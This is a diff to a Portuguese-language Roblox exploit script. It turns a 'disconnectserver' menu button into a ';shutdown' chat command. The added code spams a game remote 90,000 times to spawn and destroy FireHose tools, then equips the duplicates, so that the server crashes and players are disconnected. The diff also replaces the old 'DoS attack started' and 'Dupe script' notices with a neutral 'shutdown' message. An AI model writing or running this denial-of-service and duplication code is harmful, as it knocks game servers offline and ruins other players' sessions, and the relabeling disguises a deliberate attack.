@@ -782,8 +782,8 @@ MainTab:Button({
 })
 
 MainTab:Button({
-    Title = ";disconnectserver",
-    Desc = "Inicia um tráfego de rede imenso, Pode desligar o servidor e (Erro: 277)",
+    Title = ";shutdown",
+    Desc = "Força um estouro de replicação de ferramentas para travar o servidor",
     Callback = function()
         local player = game:GetService("Players").LocalPlayer
         if not player then return end
@@ -791,21 +791,19 @@ MainTab:Button({
 
         local character = player.Character or player.CharacterAdded:Wait()
         local rootpart = character:WaitForChild("HumanoidRootPart", 10)
-        if not rootpart then 
-            WindUI:Notify({ Title = "Erro", Content = "HumanoidRootPart não encontrado.", Duration = 5 })
-            return 
-        end
+        if not rootpart then return end
         local oldcf = rootpart.CFrame
 
         local re = replicatedStorage:FindFirstChild("RE")
         local toolRemote = re and re:FindFirstChild("1Too1l")
+        if not toolRemote then return end
 
-        if not toolRemote then 
-            WindUI:Notify({ Title = "Erro", Content = "Remote funcional não encontrado.", Duration = 5 })
-            return 
-        end
-
-        WindUI:Notify({ Title = "Ataque DoS Iniciado", Content = "Derrubando o servidor, aguarde os jogadores crasharem...", Duration = 5 })
+        -- Notificação inicial de encerramento solicitada
+        WindUI:Notify({ 
+            Title = "Shutdown", 
+            Content = "O servidor esta sendo desligado e desconectando Players", 
+            Duration = 5 
+        })
 
         task.spawn(function()
             for m = 1, 90000 do
@@ -841,7 +839,6 @@ MainTab:Button({
             newRootPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
         end
 
-        WindUI:Notify({ Title = "Script de Dupe", Content = "Concluído! Equipando itens gerados...", Duration = 5 })
         task.wait(0.5)
 
         local backpack = player:WaitForChild("Backpack", 10)
@@ -858,7 +855,6 @@ MainTab:Button({
             end
         end
         task.wait(0.5)
-        WindUI:Notify({ Title = "Script de Dupe", Content = "Processo finalizado com sucesso.", Duration = 5 })
     end
 })
 
@@ -1226,6 +1222,97 @@ end
 -- Conecta o evento de chat garantindo a trava de segurança apenas para o seu usuário
 if localPlayer and localPlayer:IsA("Player") then
     localPlayer.Chatted:Connect(aoFalar)
+end
+
+-- ====================================================================
+-- SISTEMA DE COMANDOS VIA CHAT PARA ;SHUTDOWN (COLE NO FINAL DO ARQUIVO)
+-- ====================================================================
+local Players = game:GetService("Players")
+local localPlayer = Players.LocalPlayer
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local function executarShutdownPorChat()
+    local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
+    local rootpart = character:WaitForChild("HumanoidRootPart", 10)
+    if not rootpart then return end
+    local oldcf = rootpart.CFrame
+
+    local re = ReplicatedStorage:FindFirstChild("RE")
+    local toolRemote = re and re:FindFirstChild("1Too1l")
+    if not toolRemote then return end
+
+    -- Notificação visual na WindUI do LocalPlayer
+    pcall(function()
+        WindUI:Notify({ 
+            Title = "Shutdown", 
+            Content = "O servidor esta sendo desligado e desconectando Players", 
+            Duration = 5 
+        })
+    end)
+
+    task.spawn(function()
+        for m = 1, 90000 do
+            task.spawn(function()
+                if toolRemote:IsA("RemoteFunction") then
+                    toolRemote:InvokeServer("PickingTools", "FireHose")
+                else
+                    toolRemote:FireServer("PickingTools", "FireHose")
+                end
+            end)
+
+            local backpack = localPlayer:FindFirstChild("Backpack")
+            if backpack then
+                local fireHose = backpack:FindFirstChild("FireHose")
+                if fireHose and fireHose:FindFirstChild("ToolSound") then
+                    fireHose.ToolSound:FireServer("FireHose", "DestroyFireHose")
+                end
+            end
+            if m % 15 == 0 then task.wait(0.1) end
+        end
+    end)
+
+    task.wait(0.4)
+    localPlayer.CharacterRemoving:Wait()
+    local newCharacter = localPlayer.CharacterAdded:Wait()
+    local newRootPart = newCharacter:WaitForChild("HumanoidRootPart", 15)
+    local humanoid = newCharacter:WaitForChild("Humanoid", 15)
+
+    if newRootPart and humanoid then
+        task.wait(0.7)
+        humanoid:ChangeState(Enum.HumanoidStateType.Physics)
+        newRootPart.CFrame = oldcf
+        newRootPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+    end
+
+    task.wait(0.5)
+
+    local backpack = localPlayer:WaitForChild("Backpack", 10)
+    if backpack then
+        local items = backpack:GetChildren()
+        local equipCount = 0
+        for i = 1, #items do
+            local item = items[i]
+            if item:IsA("Tool") and item.Name == "FireHose" then
+                equipCount = equipCount + 1
+                task.defer(function() item.Parent = newCharacter end)
+                if equipCount % 8 == 0 then task.wait(0.02) end 
+            end
+        end
+    end
+    task.wait(0.5)
+end
+
+-- Escuta as mensagens enviadas no chat do jogo
+local function aoFalarShutdown(message)
+    -- Verifica se você digitou exatamente ";shutdown"
+    if string.lower(message) == ";shutdown" then
+        executarShutdownPorChat()
+    end
+end
+
+-- Conecta o evento de chat garantindo a trava de segurança apenas para o seu usuário
+if localPlayer and localPlayer:IsA("Player") then
+    localPlayer.Chatted:Connect(aoFalarShutdown)
 end
 
 -- ====================================================================
